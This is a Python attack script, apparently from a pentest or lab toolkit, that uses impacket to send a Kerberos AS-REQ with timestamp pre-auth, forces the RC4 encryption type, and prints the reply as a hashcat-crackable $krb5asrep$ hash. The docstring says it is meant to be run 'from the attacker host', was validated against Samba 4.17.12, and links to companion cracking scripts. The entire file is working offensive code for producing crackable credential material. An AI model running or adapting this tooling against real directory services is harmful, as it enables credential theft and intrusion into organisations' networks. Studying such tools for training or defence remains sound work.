#!/usr/bin/env python3
"""Extract a genuine, crackable $krb5asrep$23$ (RC4) hash when unauthenticated AS-REP roasting
is impossible (e.g. a Samba embedded Heimdal KDC that forces preauth on every principal —
see references/samba-asrep-roast-impossible.md).

Because you have the LAB password, we send an AS-REQ *with* PA-ENC-TIMESTAMP pre-auth forcing
etype 23, receive the AS-REP, and emit its enc-part as the hashcat/john $krb5asrep$ string.
The AS-REP enc-part is encrypted with the user's long-term (NT-hash-derived) key exactly as in
an unauthenticated roast, so the resulting hash is identical in form and crackable with
hashcat -m 18200 (or scripts/crack-krb5tgs-rc4.py --asrep). VALIDATED against Samba 4.17.12:
the emitted hash cracked back to the known password.

Run from the attacker host (impacket in PATH/venv):
  python3 asrep-extract-authenticated.py <REALM> <user> <password> <dc_ip>
"""
import sys, datetime, random
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, AS_REP, KRB_ERROR, PA_ENC_TS_ENC, EncryptedData, seq_set, seq_set_iter
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.crypto import Key, _enctype_table
from impacket.ntlm import compute_nthash

REALM = sys.argv[1].upper()
USER  = sys.argv[2]
PW    = sys.argv[3]
DCIP  = sys.argv[4]
ETYPE = int(constants.EncryptionTypes.rc4_hmac.value)  # 23 -> hashcat 18200

nthash = compute_nthash(PW)
key = Key(ETYPE, nthash)
cipher = _enctype_table[ETYPE]

clientName = Principal(USER, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
serverName = Principal('krbtgt/%s' % REALM, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

asReq = AS_REQ()
asReq['pvno'] = 5
asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

# --- PA-ENC-TIMESTAMP pre-auth (key usage 1) ---
now = datetime.datetime.utcnow()
tsenc = PA_ENC_TS_ENC()
tsenc['patimestamp'] = KerberosTime.to_asn1(now)
tsenc['pausec'] = now.microsecond
enc_ts = cipher.encrypt(key, 1, encoder.encode(tsenc), None)
encData = EncryptedData()
encData['etype'] = ETYPE
encData['cipher'] = enc_ts
asReq['padata'] = noValue
asReq['padata'][0] = noValue
asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_ENC_TIMESTAMP.value)
asReq['padata'][0]['padata-value'] = encoder.encode(encData)

reqBody = asReq['req-body']
reqBody['kdc-options'] = constants.encodeFlags([
    constants.KDCOptions.forwardable.value,
    constants.KDCOptions.renewable.value,
    constants.KDCOptions.proxiable.value])
seq_set(reqBody, 'sname', serverName.components_to_asn1)
seq_set(reqBody, 'cname', clientName.components_to_asn1)
reqBody['realm'] = REALM
till = now + datetime.timedelta(days=1)
reqBody['till'] = KerberosTime.to_asn1(till)
reqBody['rtime'] = KerberosTime.to_asn1(till)
reqBody['nonce'] = random.getrandbits(31)
seq_set_iter(reqBody, 'etype', (ETYPE,))

try:
    r = sendReceive(encoder.encode(asReq), REALM, DCIP)
except KerberosError as e:
    print("[-] KerberosError:", e.getErrorCode(), e.getErrorString()); sys.exit(3)

try:
    asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
except Exception:
    krbErr = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
    print("[-] KRB-ERROR code=%s" % int(krbErr['error-code'])); sys.exit(3)

et = int(asRep['enc-part']['etype'])
c = asRep['enc-part']['cipher'].asOctets()
if et == 23:
    h = "$krb5asrep$%d$%s@%s:%s$%s" % (et, USER, REALM, c[:16].hex(), c[16:].hex())
else:
    h = "$krb5asrep$%d$%s@%s:%s" % (et, USER, REALM, c.hex())
print("[+] AS-REP etype=%d enc-part=%d bytes" % (et, len(c)))
print(h)
